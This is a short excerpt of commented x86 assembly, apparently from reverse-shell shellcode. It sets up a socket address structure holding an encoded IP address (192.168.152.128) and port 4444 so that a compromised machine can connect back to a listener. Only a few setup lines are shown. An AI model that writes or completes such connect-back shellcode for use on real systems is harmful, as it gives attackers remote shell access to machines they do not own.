...
;sockaddr_in{sin_family,sin_port,struct in addr sin_addr,sin_zero}
	...
	push 0x49494949 	; push address in network bytes format for struct in_addr (192.168.152.128)

	mov eax,0x53530102	; put the port in networkbytes format in eax 4444 = 5c11 the extra 0102 will be decresed to become 0002 the sinfamily since the size is word of sin-family and sin_port
